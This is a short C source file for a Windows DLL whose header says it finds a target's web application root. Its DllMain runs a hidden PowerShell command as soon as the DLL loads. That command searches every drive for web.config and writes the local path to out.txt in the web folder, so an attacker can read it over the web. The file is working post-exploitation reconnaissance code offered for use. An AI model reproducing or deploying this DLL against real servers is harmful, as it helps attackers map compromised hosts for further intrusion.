/* 
 * Straight to the point script to find the web application root directory 
 * E.g. target --> https://host.com/media/profile/images/arrow.jpg
 * Output will be https://host.com/media/profile/images/out.txt
 * Out.txt contains the full local path of arrow.jpg (e.g D:/web/new/media/profile/images/)
 */

#include <windows.h>
#include <stdio.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    if (fdwReason == DLL_PROCESS_ATTACH)
        system("powershell -nop -w 1 \"(Get-PSDrive -PSProvider FileSystem).Root | ForEach-Object { $pp=(Get-ChildItem -Path $_ -Filter web.config -Recurse -ErrorAction SilentlyContinue -Force).DirectoryName }; Out-File -FilePath $pp\\out.txt -InputObject $pp -Encoding ASCII -Force -ErrorAction SilentlyContinue\"");
    return TRUE;
}
